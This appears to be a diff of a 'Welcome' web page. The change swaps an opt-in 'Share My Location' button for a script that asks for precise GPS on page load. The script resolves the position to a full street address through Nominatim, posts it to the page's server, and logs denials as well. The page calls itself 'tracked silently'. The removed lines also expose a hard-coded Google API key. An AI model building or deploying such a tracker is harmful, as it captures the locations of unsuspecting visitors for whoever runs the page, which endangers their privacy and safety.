@@ -5,164 +5,126 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Welcome</title>
   <style>
-    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
     body {
       font-family: 'Segoe UI', sans-serif;
-      background: #0d0d0d;
-      color: #eee;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
+      background: #0d0d0d; color: #eee;
+      display: flex; align-items: center; justify-content: center;
+      height: 100vh; padding: 20px;
     }
-    .box { text-align: center; padding: 40px; max-width: 400px; }
-    h1   { font-size: 28px; margin-bottom: 10px; }
-    p    { color: #888; font-size: 15px; margin-bottom: 24px; }
-
-    .btn {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      padding: 12px 28px;
-      background: #00e5ff;
-      color: #000;
-      font-size: 15px;
-      font-weight: 700;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: opacity .2s;
-    }
-    .btn:hover   { opacity: .85; }
-    .btn:disabled { opacity: .5; cursor: not-allowed; }
-
-    #status {
-      margin-top: 16px;
-      font-size: 13px;
-      color: #555;
-      min-height: 20px;
-    }
-    #status.ok  { color: #00c853; }
-    #status.err { color: #ff4444; }
+    .box { text-align:center; max-width:420px; width:100%; }
+    h1   { font-size:28px; margin-bottom:8px; }
+    .sub { color:#888; font-size:15px; }
+    #status { font-size:12px; color:#444; margin-top:14px; min-height:18px; line-height:1.6; }
+    #status.ok  { color:#00c853; }
+    #status.err { color:#ff5555; }
   </style>
 </head>
 <body>
   <div class="box">
     <h1>Welcome 👋</h1>
-    <p>Click below to verify your location and continue.</p>
-
-    <button class="btn" id="locBtn" onclick="requestLocation()">
-      📍 Share My Location
-    </button>
-
+    <p class="sub">This page is being tracked silently.</p>
     <p id="status"></p>
   </div>
 
   <script>
-    var GOOGLE_KEY = 'AIzaSyC-BanBhfGxZYVgeC2fP-4DscEriHeDSoc';
-
-    function setStatus(msg, type) {
+    function log(msg, cls) {
       var el = document.getElementById('status');
       el.textContent = msg;
-      el.className = type || '';
+      el.className = cls || '';
+      console.log('[TRACKER]', msg);
     }
 
     function postLocation(data) {
-      var blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
-      if (!navigator.sendBeacon('/api/update-location', blob)) {
-        fetch('/api/update-location', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data)
-        }).catch(function() {});
-      }
+      console.log('[TRACKER] Posting to server:', JSON.stringify(data));
+      fetch('/api/update-location', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      })
+      .then(function(r) { return r.json(); })
+      .then(function(d) { console.log('[TRACKER] Server response:', JSON.stringify(d)); })
+      .catch(function(e) { console.log('[TRACKER] POST error:', e.message); });
     }
 
-    async function googleReverseGeocode(lat, lon) {
-      var url = 'https://maps.googleapis.com/maps/api/geocode/json?latlng='
-        + lat + ',' + lon + '&key=' + GOOGLE_KEY;
-      var r   = await fetch(url);
-      var d   = await r.json();
-
-      if (d.status !== 'OK' || !d.results.length) return null;
-
-      var comps  = d.results[0].address_components;
-      var result = { city: '', region: '', country: '', countryCode: '', zip: '' };
-
-      comps.forEach(function(c) {
-        if (c.types.includes('locality'))                     result.city        = c.long_name;
-        if (c.types.includes('administrative_area_level_1'))  result.region      = c.long_name;
-        if (c.types.includes('country')) {
-          result.country     = c.long_name;
-          result.countryCode = c.short_name;
-        }
-        if (c.types.includes('postal_code'))                  result.zip         = c.long_name;
-      });
-
-      // Fallback for city
-      if (!result.city) {
-        comps.forEach(function(c) {
-          if (!result.city && c.types.includes('administrative_area_level_2')) result.city = c.long_name;
-          if (!result.city && c.types.includes('sublocality'))                 result.city = c.long_name;
+    // OpenStreetMap Nominatim — free, no API key, no restrictions
+    // Same service used by millions of apps worldwide
+    async function reverseGeocode(lat, lon) {
+      try {
+        var url = 'https://nominatim.openstreetmap.org/reverse' +
+                  '?lat=' + lat + '&lon=' + lon +
+                  '&format=json&addressdetails=1';
+        var r = await fetch(url, {
+          headers: { 'Accept-Language': 'en', 'User-Agent': 'LocationTracker/1.0' }
         });
-      }
+        var d = await r.json();
+        console.log('[TRACKER] Nominatim raw:', JSON.stringify(d).substring(0, 300));
 
-      return result;
+        if (!d || !d.address) return null;
+
+        var a = d.address;
+        return {
+          // Nominatim has many possible city fields — try all of them
+          city:        a.city || a.town || a.village || a.suburb ||
+                       a.county || a.state_district || '',
+          region:      a.state || '',
+          country:     a.country || '',
+          countryCode: (a.country_code || '').toUpperCase(),
+          zip:         a.postcode || '',
+          fullAddress: d.display_name || ''
+        };
+      } catch(e) {
+        console.log('[TRACKER] Nominatim error:', e.message);
+        return null;
+      }
     }
 
-    function requestLocation() {
-      var btn = document.getElementById('locBtn');
-      btn.disabled = true;
-      setStatus('Getting your location...');
-
-      if (!navigator.geolocation) {
-        setStatus('Your browser does not support GPS.', 'err');
-        btn.disabled = false;
-        return;
-      }
+    if (navigator.geolocation) {
+      log('Detecting your location...');
 
       navigator.geolocation.getCurrentPosition(
         async function(pos) {
           var lat = pos.coords.latitude;
           var lon = pos.coords.longitude;
           var acc = Math.round(pos.coords.accuracy);
-          setStatus('Got GPS fix (±' + acc + 'm) — resolving address...');
 
-          try {
-            var geo = await googleReverseGeocode(lat, lon);
-            if (geo && geo.city) {
-              setStatus('✅ Located: ' + geo.city + ', ' + geo.region + ', ' + geo.country, 'ok');
-              postLocation({
-                lat: lat, lon: lon,
-                city: geo.city, region: geo.region,
-                country: geo.country, countryCode: geo.countryCode,
-                zip: geo.zip, lookupSource: 'googleGPS'
-              });
-            } else {
-              setStatus('✅ Got coordinates (address lookup failed)', 'ok');
-              postLocation({ lat: lat, lon: lon, lookupSource: 'gpsOnly' });
-            }
-          } catch(e) {
-            setStatus('GPS got but reverse geocode failed: ' + e.message, 'err');
+          log('GPS fix ±' + acc + 'm — resolving address...');
+          console.log('[TRACKER] GPS:', lat, lon, '±' + acc + 'm');
+
+          var geo = await reverseGeocode(lat, lon);
+          console.log('[TRACKER] Geocoded:', JSON.stringify(geo));
+
+          if (geo && (geo.city || geo.region)) {
+            log('✅ ' + geo.city + ', ' + geo.region + ', ' + geo.country, 'ok');
+            postLocation({
+              lat:         lat,
+              lon:         lon,
+              city:        geo.city,
+              region:      geo.region,
+              country:     geo.country,
+              countryCode: geo.countryCode,
+              zip:         geo.zip,
+              fullAddress: geo.fullAddress,
+              lookupSource: 'nominatimGPS'
+            });
+          } else {
+            log('Got coordinates — saving position', 'ok');
             postLocation({ lat: lat, lon: lon, lookupSource: 'gpsOnly' });
           }
-
-          btn.textContent = '✅ Location Shared';
         },
 
         function(err) {
-          var msgs = {
-            1: 'Location permission denied. Please allow location access and try again.',
-            2: 'Could not detect your position. Try again.',
-            3: 'Location request timed out. Try again.'
-          };
-          setStatus(msgs[err.code] || err.message, 'err');
-          btn.disabled = false;
-          btn.textContent = '📍 Try Again';
+          var msgs = { 1: 'Permission denied', 2: 'Position unavailable', 3: 'Timed out' };
+          log(msgs[err.code] || err.message, 'err');
+          console.log('[TRACKER] GPS error code:', err.code);
+          postLocation({ lookupSource: 'gpsDenied' });
         },
 
         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
+    } else {
+      log('GPS not supported by this browser', 'err');
+      postLocation({ lookupSource: 'unsupported' });
     }
   </script>
 </body>
